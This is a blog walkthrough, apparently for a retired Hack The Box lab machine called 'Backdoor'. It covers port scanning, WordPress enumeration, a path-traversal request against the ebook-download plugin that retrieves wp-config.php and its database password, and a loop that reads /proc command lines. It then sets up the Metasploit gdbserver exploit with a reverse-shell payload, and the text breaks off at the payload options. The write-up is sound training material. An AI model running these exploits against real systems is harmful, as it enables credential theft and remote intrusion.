<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        Backdoor -- HTB walkthrough ::
        Werz — CyberSecurity
      </title>
    
    <head>
  
<script async src="https://www.googletagmanager.com/gtag/js?id=G-R2DLLBQDPX"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-R2DLLBQDPX', { 'anonymize_ip': false });
}
</script>



<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="The official box page on HTB #  Walkthrough #  Port Scanning | IP: 10.10.11.125 #  lets echo the ip to the /etc/hosts file with backdoor.htb name.
sudo bash -c &amp;#34;echo &amp;#39;10.10.11.125 backdoor.htb&amp;#39; &amp;gt;&amp;gt; /etc/hosts&amp;#34; fire up a ports scan only (im using naabu tool), this will save a lot of time for us.
naabu -host backdoor.htb -p 20-2000 __ ___ ___ ___ _/ / __ __ / _ \/ _ \/ _ \/ _ \/ // / /_//_/\_,_/\_,_/_."
/>
<meta name="twitter:card" content="https://werz.is-a.dev/img/og_icon.png">
<meta name="og:site_name" content="Werz Portfolio | Cybersecurity content | CTF writeup | CTF walkthrough ">
<meta name="twitter:image:alt" content="Werz">
<meta
  name="keywords"
  content="ctf, hackthebox, writeup, htb writeup, walkthrough, retired htb, hack the box, cybersecurtiy, capture the flag"
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://werz.info/blog/20/11/2022/backdoor/" />
<meta content="Portfolio - Cybersecurity Posts - CTF" property="og:description" />
<meta content="https://werz.is-a.dev/" property="og:url" />
<meta property="og:image" content="https://werz.is-a.dev/img/og_icon.png">
<meta property="fb:app_id" content="your_app_id" />
<meta name="twitter:site" content="@werz0xff">
<meta content="Werz Portfolio | Cybersecurity content" property="og:title" />





<link rel="stylesheet" href="https://werz.info/blog/assets/style.css" />

<link rel="stylesheet" href="https://werz.info/blog/style.css" />


<link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png%20%7c%20absURL">
<link rel="icon" type="image/png" sizes="32x32" href="img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="img//android-chrome-192x192.png">
<link rel="manifest" href="img/site.webmanifest">
<link rel="mask-icon" href="img/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">


<link href="https://werz.info/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://werz.info/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://werz.info/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://werz.info/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://werz.info/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://werz.info/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Backdoor -- HTB walkthrough"/>
<meta name="twitter:description" content="Backdoor is a easy ranked linux box"/>



<meta property="og:title" content="Backdoor -- HTB walkthrough" />
<meta property="og:description" content="Backdoor is a easy ranked linux box" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://werz.info/blog/20/11/2022/backdoor/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-11-20T09:31:46+13:00" />
<meta property="article:modified_time" content="2022-11-20T09:31:46+13:00" /><meta property="og:site_name" content="Werz" />






</head>
  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="https://werz.is-a.dev/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >werz@blog:~$</span
    >
    <span class="logo__cursor"></span>
  
</a>
    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="../../../../blog/archive">./archive</a></li>
        
      
        
          <li><a href="../../../../blog/posts">./articles</a></li>
        
      
        
          <li><a href="../../../../blog/about">./whoami</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="../../../../blog/archive">./archive</a></li>
      
    
      
        <li><a href="../../../../blog/posts">./articles</a></li>
      
    
      
        <li><a href="../../../../blog/about">./whoami</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">Backdoor &ndash; HTB walkthrough</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2022-11-20
        </span>

        
          
        
      

      


      
        <span class="post-read-time"
          >— 11 min read</span
        >
      
    </div>

    
      <span class="post-tags">
        
          <a href="https://werz.info/blog/tags/htb/">#htb</a>&nbsp;
        
          <a href="https://werz.info/blog/tags/linux/">#linux</a>&nbsp;
        
          <a href="https://werz.info/blog/tags/easy/">#easy</a>&nbsp;
        
          <a href="https://werz.info/blog/tags/retired/">#retired</a>&nbsp;
        
      </span>
    

    

    <div class="post-content">
      
      The official <h3 id="the-official-box-pagehttpsapphacktheboxcommachinesbackdoor-on-htb">
  <a href="https://app.hackthebox.com/machines/Backdoor" target="_blank">box page</a>
 on HTB
  <a href="#the-official-box-pagehttpsapphacktheboxcommachinesbackdoor-on-htb" class="h-anchor" aria-hidden="true">#</a>
</h3>
<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/backdoor/img/Backdoor.png" style="border-radius: 3%;" alt="">
<h3 id="walkthrough">
  Walkthrough
  <a href="#walkthrough" class="h-anchor" aria-hidden="true">#</a>
</h3>
<h4 id="port-scanning--ip-101011125">
  Port Scanning | <strong>IP: 10.10.11.125</strong>
  <a href="#port-scanning--ip-101011125" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>lets <strong>echo</strong> the ip to the <code>/etc/hosts</code> file with <code>backdoor.htb</code> name.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo bash -c <span style="color:#e6db74">&#34;echo &#39;10.10.11.125        backdoor.htb&#39; &gt;&gt; /etc/hosts&#34;</span>
</code></pre></div><p>fire up a ports scan only (im using <strong>naabu</strong> tool), this will save a lot of time for us.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">naabu -host backdoor.htb -p 20-2000     

                  __
  ___  ___  ___ _/ /  __ __
 / _ <span style="color:#ae81ff">\/</span> _ <span style="color:#ae81ff">\/</span> _ <span style="color:#ae81ff">\/</span> _ <span style="color:#ae81ff">\/</span> // /
/_//_/<span style="color:#ae81ff">\_</span>,_/<span style="color:#ae81ff">\_</span>,_/_.__/<span style="color:#ae81ff">\_</span>,_/ v2.0.6

		projectdiscovery.io

Use with caution. You are responsible <span style="color:#66d9ef">for</span> your actions
Developers assume no liability and are not responsible <span style="color:#66d9ef">for</span> any misuse or damage.
<span style="color:#f92672">[</span>INF<span style="color:#f92672">]</span> Running CONNECT scan with non root privileges
<span style="color:#f92672">[</span>INF<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">3</span> ports on host backdoor.htb <span style="color:#f92672">(</span>10.10.11.125<span style="color:#f92672">)</span>
backdoor.htb:22
backdoor.htb:80
backdoor.htb:1337
</code></pre></div><h2 id="open-ports">
  Open Ports
  <a href="#open-ports" class="h-anchor" aria-hidden="true">#</a>
</h2>
<table>
<thead>
<tr>
<th>Ports</th>
<th>Service</th>
<th>Takeaways</th>
</tr>
</thead>
<tbody>
<tr>
<td>22</td>
<td>SSH</td>
<td>OpenSSH 8.2p1</td>
</tr>
<tr>
<td>80</td>
<td>HTTP</td>
<td>Apache httpd 2.4.41</td>
</tr>
<tr>
<td>1337</td>
<td>waste?</td>
<td>none</td>
</tr>
</tbody>
</table>
<p>now lets check the ports with nmap.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap backdoor.htb -sV -sC -p 22,80,1337 -T4 
Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-05-06 17:19 CET
Nmap scan report <span style="color:#66d9ef">for</span> backdoor.htb <span style="color:#f92672">(</span>10.10.11.125<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.060s latency<span style="color:#f92672">)</span>.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">3072</span> b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp   open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &amp;<span style="color:#75715e">#8211; Real-Life</span>
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 20.01 seconds
</code></pre></div><p>so its running a wordpress webpage thats interesting.</p>
<h3 id="web-enumeration">
  Web enumeration
  <a href="#web-enumeration" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>lets run a gobuster scan for that webpage in the same time lets do a <a href="https://github.com/wpscanteam/wpscan" target="_blank">wpscan</a>
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://backdoor.htb -w ~/opt/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt    ✔  05:26:19 PM  
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://backdoor.htb
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /home/werz/opt/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2022/05/06 17:26:24 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/wp-content           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 317<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://backdoor.htb/wp-content/<span style="color:#f92672">]</span>
/wp-includes          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 318<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://backdoor.htb/wp-includes/<span style="color:#f92672">]</span>
/wp-admin             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 315<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://backdoor.htb/wp-admin/<span style="color:#f92672">]</span>   
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://backdoor.htb/                                                                                   ✔  05:37:43 PM  
_______________________________________________________________
         __          _______   _____
         <span style="color:#ae81ff">\ \ </span>       / /  __ <span style="color:#ae81ff">\ </span>/ ____|
          <span style="color:#ae81ff">\ \ </span> /<span style="color:#ae81ff">\ </span> / /| |__<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>___   ___  __ _ _ __ ®
           <span style="color:#ae81ff">\ \/</span>  <span style="color:#ae81ff">\/</span> / |  ___/ <span style="color:#ae81ff">\_</span>__ <span style="color:#ae81ff">\ </span>/ __|/ _<span style="color:#e6db74">`</span> | <span style="color:#e6db74">&#39;_ \
</span><span style="color:#e6db74">            \  /\  /  | |     ____) | (__| (_| | | | |
</span><span style="color:#e6db74">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">         WordPress Security Scanner by the WPScan Team
</span><span style="color:#e6db74">                         Version 3.8.22
</span><span style="color:#e6db74">       Sponsored by Automattic - https://automattic.com/
</span><span style="color:#e6db74">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
</span><span style="color:#e6db74">_______________________________________________________________
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[i] It seems like you have not updated the database for some time.
</span><span style="color:#e6db74">[?] Do you want to update now? [Y]es [N]o, default: [N]n
</span><span style="color:#e6db74">[+] URL: http://backdoor.htb/ [10.10.11.125]
</span><span style="color:#e6db74">[+] Started: Fri May  6 17:37:58 2022
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Interesting Finding(s):
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[+] Headers
</span><span style="color:#e6db74"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
</span><span style="color:#e6db74"> | Found By: Headers (Passive Detection)
</span><span style="color:#e6db74"> | Confidence: 100%
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[+] XML-RPC seems to be enabled: http://backdoor.htb/xmlrpc.php
</span><span style="color:#e6db74"> | Found By: Direct Access (Aggressive Detection)
</span><span style="color:#e6db74"> | Confidence: 100%
</span><span style="color:#e6db74"> | References:
</span><span style="color:#e6db74"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API
</span><span style="color:#e6db74"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
</span><span style="color:#e6db74"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
</span><span style="color:#e6db74"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
</span><span style="color:#e6db74"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[+] WordPress readme found: http://backdoor.htb/readme.html
</span><span style="color:#e6db74"> | Found By: Direct Access (Aggressive Detection)
</span><span style="color:#e6db74"> | Confidence: 100%
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[+] Upload directory has listing enabled: http://backdoor.htb/wp-content/uploads/
</span><span style="color:#e6db74"> | Found By: Direct Access (Aggressive Detection)
</span><span style="color:#e6db74"> | Confidence: 100%
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[+] The external WP-Cron seems to be enabled: http://backdoor.htb/wp-cron.php
</span><span style="color:#e6db74"> | Found By: Direct Access (Aggressive Detection)
</span><span style="color:#e6db74"> | Confidence: 60%
</span><span style="color:#e6db74"> | References:
</span><span style="color:#e6db74"> |  - https://www.iplocation.net/defend-wordpress-from-ddos
</span><span style="color:#e6db74"> |  - https://github.com/wpscanteam/wpscan/issues/1299
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
</span><span style="color:#e6db74"> | Found By: Rss Generator (Passive Detection)
</span><span style="color:#e6db74"> |  - http://backdoor.htb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;
</span><span style="color:#e6db74"> |  - http://backdoor.htb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[+] WordPress theme in use: twentyseventeen
</span><span style="color:#e6db74"> | Location: http://backdoor.htb/wp-content/themes/twentyseventeen/
</span><span style="color:#e6db74"> | Last Updated: 2022-01-25T00:00:00.000Z
</span><span style="color:#e6db74"> | Readme: http://backdoor.htb/wp-content/themes/twentyseventeen/readme.txt
</span><span style="color:#e6db74"> | [!] The version is out of date, the latest version is 2.9
</span><span style="color:#e6db74"> | Style URL: http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208
</span><span style="color:#e6db74"> | Style Name: Twenty Seventeen
</span><span style="color:#e6db74"> | Style URI: https://wordpress.org/themes/twentyseventeen/
</span><span style="color:#e6db74"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
</span><span style="color:#e6db74"> | Author: the WordPress team
</span><span style="color:#e6db74"> | Author URI: https://wordpress.org/
</span><span style="color:#e6db74"> |
</span><span style="color:#e6db74"> | Found By: Css Style In Homepage (Passive Detection)
</span><span style="color:#e6db74"> |
</span><span style="color:#e6db74"> | Version: 2.8 (80% confidence)
</span><span style="color:#e6db74"> | Found By: Style (Passive Detection)
</span><span style="color:#e6db74"> |  - http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: &#39;</span>Version: 2.8<span style="color:#960050;background-color:#1e0010">&#39;</span>

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating All Plugins <span style="color:#f92672">(</span>via Passive Methods<span style="color:#f92672">)</span>

<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> No plugins Found.

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating Config Backups <span style="color:#f92672">(</span>via Passive and Aggressive Methods<span style="color:#f92672">)</span>
 Checking Config Backups - Time: 00:00:03 &lt;<span style="color:#f92672">===================================================================================================</span>&gt; <span style="color:#f92672">(</span><span style="color:#ae81ff">137</span> / 137<span style="color:#f92672">)</span> 100.00% Time: 00:00:03

<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> No Config Backups Found.

<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> You can get a free API token with <span style="color:#ae81ff">25</span> daily requests by registering at https://wpscan.com/register

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finished: Fri May  <span style="color:#ae81ff">6</span> 17:38:07 <span style="color:#ae81ff">2022</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Requests Done: <span style="color:#ae81ff">139</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Cached Requests: <span style="color:#ae81ff">37</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Sent: 35.218 KB
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Received: 19.746 KB
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Memory used: 231.035 MB
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Elapsed time: 00:00:08
</code></pre></div><p>lets take a manual look for the wordpress plugins used in <code>http://backdoor.htb/wp-content/plugins/</code> so yeah there is a plugin called <strong>ebook-download</strong>. we&rsquo;ve could catch it with wpscan scan on the aggressive mode btw.</p>
<p>I did some google researches seems there is a <strong>Directory Traversal</strong> (LFI) vuln. <a href="https://www.exploit-db.com/exploits/39575" target="_blank">exploit-db</a>
</p>
<p>lets try send a request to that file</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget <span style="color:#e6db74">&#39;http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php&#39;</span> -O wp-config.php
--2022-05-06 18:09:07--  http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span style="color:#f92672">=</span>../../../wp-config.php
Resolving backdoor.htb <span style="color:#f92672">(</span>backdoor.htb<span style="color:#f92672">)</span>... 10.10.11.125
Connecting to backdoor.htb <span style="color:#f92672">(</span>backdoor.htb<span style="color:#f92672">)</span>|10.10.11.125|:80... connected.
HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
Length: <span style="color:#ae81ff">3866</span> <span style="color:#f92672">(</span>3.8K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
Saving to: ‘wp-config.php’

wp-config.php                                100%<span style="color:#f92672">[============================================================================================</span>&gt;<span style="color:#f92672">]</span>   3.78K  --.-KB/s    in 0.002s  

2022-05-06 18:09:07 <span style="color:#f92672">(</span>2.11 MB/s<span style="color:#f92672">)</span> - ‘wp-config.php’ saved <span style="color:#f92672">[</span>3866/3866<span style="color:#f92672">]</span>
</code></pre></div><p>yay! it works. lets see if there is a important information in.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">grep PASS wp-config.php
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;MQYBJSaD#DxG6qbm&#39;</span> <span style="color:#f92672">)</span>;
</code></pre></div><p>I tried login with an admin user and the password we&rsquo;ve find, I tried it with SSH too. did not help</p>
<p>well, so lets try dumping the processes running inside the machine through the <strong>/proc</strong> folder. im gonna make a simple bash script to make curl requests for 1000 pid for now.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">0</span> 1000<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span style="color:#f92672">=</span>/proc/<span style="color:#e6db74">${</span>i<span style="color:#e6db74">}</span>/cmdline --output - | cut -d<span style="color:#e6db74">&#39;/&#39;</span> -f 8- | sed <span style="color:#e6db74">&#39;s/&lt;script.*//g&#39;</span> &gt; $i; <span style="color:#66d9ef">done</span>
</code></pre></div><p>There is a lot of files lets filter some, what if we filtered for that port we&rsquo;ve noticed <strong>1337</strong> why not.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat * | grep -a <span style="color:#ae81ff">1337</span>
proc/831/cmdline/bin/sh-cwhile true;<span style="color:#66d9ef">do</span> su user -c <span style="color:#e6db74">&#34;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;&#34;</span>; <span style="color:#66d9ef">done</span>
</code></pre></div><p>well so there is a gdbserver running on that port if im not wrong. I assume there is some exploits in <strong>Metasploit</strong>, lets give it a try!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       <span style="color:#f92672">=[</span> metasploit v6.1.35-dev                          <span style="color:#f92672">]</span>
+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">2209</span> exploits - <span style="color:#ae81ff">1171</span> auxiliary - <span style="color:#ae81ff">395</span> post       <span style="color:#f92672">]</span>
+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">617</span> payloads - <span style="color:#ae81ff">45</span> encoders - <span style="color:#ae81ff">11</span> nops            <span style="color:#f92672">]</span>
+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">9</span> evasion                                       <span style="color:#f92672">]</span>

Metasploit tip: Metasploit can be configured at startup, see 
msfconsole --help to learn more

msf6 &gt; search gdb

Matching Modules
<span style="color:#f92672">================</span>

   <span style="color:#75715e">#  Name                                            Disclosure Date  Rank       Check  Description</span>
   -  ----                                            ---------------  ----       -----  -----------
   <span style="color:#ae81ff">0</span>  exploit/multi/gdb/gdb_server_exec               2014-08-24       great      No     GDB Server Remote Payload Execution
   <span style="color:#ae81ff">1</span>  exploit/linux/local/ptrace_sudo_token_priv_esc  2019-03-24       excellent  Yes    ptrace Sudo Token Privilege Escalation


Interact with a module by name or index. For example info 1, use <span style="color:#ae81ff">1</span> or use exploit/linux/local/ptrace_sudo_token_priv_esc

msf6 &gt; use <span style="color:#ae81ff">0</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit<span style="color:#f92672">(</span>multi/gdb/gdb_server_exec<span style="color:#f92672">)</span> &gt; show options

Module options <span style="color:#f92672">(</span>exploit/multi/gdb/gdb_server_exec<span style="color:#f92672">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXE_FILE  /bin/true        no        The exe to spawn when gdbserver is not attached to a process.
   RHOSTS                     yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Usin
                                        g-Metasploit
   RPORT                      yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>


Payload options <span style="color:#f92672">(</span>linux/x64/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:

   Name   Current Setting  Required  Description
